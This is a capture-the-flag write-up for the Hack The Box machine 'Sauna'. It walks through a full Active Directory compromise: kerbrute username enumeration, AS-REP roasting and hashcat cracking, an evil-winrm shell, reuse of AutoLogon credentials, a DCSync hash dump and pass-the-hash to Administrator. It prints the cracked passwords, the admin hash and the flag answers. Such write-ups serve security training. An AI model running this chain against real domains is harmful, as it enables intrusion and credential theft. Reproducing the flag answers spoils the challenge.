# Sauna - Easy

```shell
sudo vim /etc/hosts
#add sauna.htb

nmap -T4 -p- -A -Pn -v 10.10.10.175

#enumerate smb
smbmap -H 10.10.10.175
#no results

#enumerate ldap
ldapsearch -H ldap://10.10.10.175 -x

#add namingcontexts flag
ldapsearch -H ldap://10.10.10.175 -x -s base namingcontexts
#gives DC names

ldapsearch -H ldap://10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL"

ldapsearch -H ldap://10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL" "objectclass=user" sAMAccountName
#no usernames shown

crackmapexec smb 10.10.10.175
#alt way to get host and domain name

#explore and scan web directories
gobuster dir -u http://sauna.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml -t 50
#nothing useful

#attempt enumeration using rpcclient
rpcclient 10.10.10.175
#does not work

rpcclient -U "" -N 10.10.10.175
#we get prompt

enumdomusers
#access denied
#exit rpcclient

#enumerate dns with dig
dig axfr @10.10.10.175 sauna.htb

dig axfr @10.10.10.175 egotistical-bank.local
#zone transfer fail

#we can enumerate kerberos using kerbrute tool
#before that, we need usernames

vim names.txt
#paste names from website

python3 namemash.py names.txt > usernames.txt
#use namemash.py to generate usernames from list

less usernames.txt
#we have possible usernames

./kerbrute_linux_amd64
#kerbrute tool

./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL ~/usernames.txt
#only 'fsmith' is valid username

echo 'fsmith' > validusernames.txt

GetNPUsers.py -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ -usersfile validusernames.txt -request
#gives hash

hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 
#cracks the hash

evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
#we get shell as fsmith

#get user flag from fsmith desktop

upload /home/sv/Tools/winPEASx64.exe

.\winPEASx64.exe
#run winpeas

upload /home/sv/Tools/SharpHound.exe
#upload SharpHound.exe to victim machine

#run SharpHound
.\SharpHound.exe -c all

#on attacker machine
#start neo4j and bloodhound
sudo neo4j console

#in new tab
cd /opt/BloodHound/BloodHound-linux-x64

./BloodHound --no-sandbox
#starts bloodhound, use creds neo4j:bloodhound

#in evil-winrm session
download C:\Users\FSmith\20221226160621_BloodHound.zip /home/sv/sauna.zip
#open the zip file in bloodhound

#go through winpeas output and bloodhound result
#winpeas output gives autologon creds for svc_loanmanager

#in attacker
#logging in as svc_loanmanager
evil-winrm -u svc_loanmanager -p "Moneymakestheworldgoround\!" -i 10.10.10.175
#this does not work

#in evil-winrm session as fsmith
#check users
net user
#this shows svc_loanmgr

evil-winrm -u svc_loanmgr -p "Moneymakestheworldgoround\!" -i 10.10.10.175
#now we can login

#we can go through bloodhound result
#mark fsmith and svc_loanmgr as owned
#and find paths for privesc

#svc_loanmgr has dcsync rights
#this can be abused

#in attacker, use impacket tool
secretsdump.py egotistical.local/svc_loanmgr:Moneymakestheworldgoround\!@10.10.10.175
#dumps hashes

#use evil-winrm pass-the-hash
evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175
#we get shell as Administrator
#get root flag
```

* Open ports & services:

  * 53 - domain - Simple DNS Plus
  * 80 - http - Microsoft IIS httpd 10.0
  * 88 - kerberos-sec - Kerberos
  * 135 - msrpc - RPC
  * 139 - netbios-ssn
  * 389 - ldap - AD LDAP
  * 445 - microsoft-ds
  * 464 - kpasswd5
  * 593 - ncacn_http - RPC over HTTP 1.0
  * 3268 - ldap - AD LDAP
  * 5985 - http - Microsoft HTTPAPI httpd 2.0
  * 9389 - mc-nmf - .NET Message Framing

* For the target Windows machine, ```nmap``` shows domain name as "EGOTISTICAL-BANK.LOCAL0"

* Enumerating SMB shares using ```smbmap``` does not give us any results.

* We can enumerate LDAP using ```ldapsearch``` but this also fails to give any results; this only gives us the domain "egotistical-bank.local"

* Alternatively, we can use ```crackmapexec``` to get the host and domain name for the machine.

* We can use ```gobuster``` to enumerate the web directories while we explore the page.

* The webpage is for "Egotistical Bank"; it contains a few pages.

* /about.html page contains a few names; this could be usernames:

  * Fergus Smith
  * Shaun Coins
  * Hugo Bear
  * Steven Kerb
  * Bowie Taylor
  * Sophie Driver

* Scanning the web directories does not give us anything of use.

* We can attempt enumeration using ```rpcclient```, but this gives us access denied error.

* We can try enumerating DNS by trying a 'zone transfer' using ```dig``` with domains 'sauna.htb' and 'egotistical-bank.local' - but this does not give anything.

* Now, we can try enumerating ```Kerberos``` using ```kerbrute``` - this tool is used to brute-force and enumerate valid AD usernames by abusing ```Kerberos``` pre-auth.

* Before running this tool, we need a list of usernames; with the names enumerated earlier, we can generate some possible usernames with scripts like ```namemash.py```:

```python
#!/usr/bin/env python3

'''
NameMash by superkojiman

Generate a list of possible usernames from a person's first and last name. 

https://blog.techorganic.com/2011/07/17/creating-a-user-name-list-for-brute-force-attacks/
'''

import sys
import os.path

if __name__ == '__main__': 
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} names.txt')
        sys.exit(0)

    if not os.path.exists(sys.argv[1]): 
        print(f'{sys.argv[1]} not found')
        sys.exit(0)

    with open(sys.argv[1]) as f:
        for line in enumerate(f): 

            # remove anything in the name that aren't letters or spaces
            name = ''.join([c for c in line[1] if  c == ' ' or  c.isalpha()])
            tokens = name.lower().split()

            if len(tokens) < 1: 
                # skip empty lines
                continue
            
            # assume tokens[0] is the first name
            fname = tokens[0]

            # remaining elements in tokens[] must be the last name
            lname = ''

            if len(tokens) == 2: 
                # assume traditional first and last name
                # e.g. John Doe
                lname = tokens[-1]

            elif len(tokens) > 2: 
                # assume multi-barrelled surname
                # e.g. Jane van Doe

                # remove the first name
                del tokens[0]

                # combine the multi-barrelled surname
                lname = ''.join([s for s in tokens])

            # create possible usernames
            print(fname + lname)           # johndoe
            print(lname + fname)           # doejohn
            print(fname + '.' + lname)     # john.doe
            print(lname + '.' + fname)     # doe.john
            print(lname + fname[0])        # doej
            print(fname[0] + lname)        # jdoe
            print(lname[0] + fname)        # djoe
            print(fname[0] + '.' + lname)  # j.doe
            print(lname[0] + '.' + fname)  # d.john
            print(fname)                   # john
            print(lname)                   # joe
```

* Using this script, we can generate possible usernames from the list of names we got from the webpage.

* We can use ```kerbrute``` now to enumerate valid usernames - this shows 'fsmith' as a valid username; we can add this to a separate file.

* We can try "AS-REP Roasting" attack using ```GetNPUsers.py``` - this tool attempts to list & get TGTs for users with 'UF_DONT_REQUIRE_PREAUTH' set.

* With the valid usernames list, running ```GetNPUsers.py``` gives us a Kerberos hash; we can crack this now using ```hashcat```.

* We successfully crack the hash, and this gives us the password "Thestrokes23" - we can get a shell using ```evil-winrm``` for user 'fsmith' now.

* After getting user flag, we can now attempt to enumerate the AD environment using ```bloodhound```.

* As we are using ```evil-winrm```, we can use the inbuilt 'upload' and 'download' commands to transfer files instead of ```smbserver.py```.

* Simultaneously, we can run ```winpeas``` as well for basic enumeration.

* Meanwhile, on attacker machine, we can start ```neo4j``` and ```bloodhound```; after ```SharpHound``` completes execution, we can download the result .zip file to attacker machine and open it in ```bloodhound```.

* We can also go through the ```winpeas``` output now - this shows that ```AutoLogon``` creds were found.

* From this, we get the creds "svc_loanmanager:Moneymakestheworldgoround!"

* We can attempt logging in as 'svc_loanmanager' via ```evil-winrm``` but this does not work.

* Using ```net user``` command in ```evil-winrm``` session as 'fsmith', we can see that there is no user named 'svc_loanmanager' - but there is a user 'svc_loanmgr'.

* So, we can login as 'svc_loanmgr' with the ```AutoLogon``` password found earlier.

* Meanwhile, we can also go through the ```bloodhound``` output; start by marking the users 'fsmith' and 'svc_loanmgr' as Owned, and search for privesc routes using pre-built queries.

* Using the query ```Find Principals with DCSync Rights```, we can see that the 'svc_loanmgr' user can DCSync to 'egotistical-bank.local'.

* Checking the 'Abuse Info' section of the edge shows that we can abuse this DCSync right by performing a DCSync attack.

* We can do this either using ```mimikatz``` or ```secretsdump.py``` (impacket).

* Running ```secretsdump.py``` dumps NTLM hashes for all users, and this includes Administrator.

* With ```evil-winrm``` and its Pass-The-Hash feature, we are able to login as Administrator and get root flag.

```markdown
1. User flag - dcab6bb7164479c613b38ffcf76a51ed

2. Root flag - 641aa5dfbef8a46550a545ef69a30a70
```
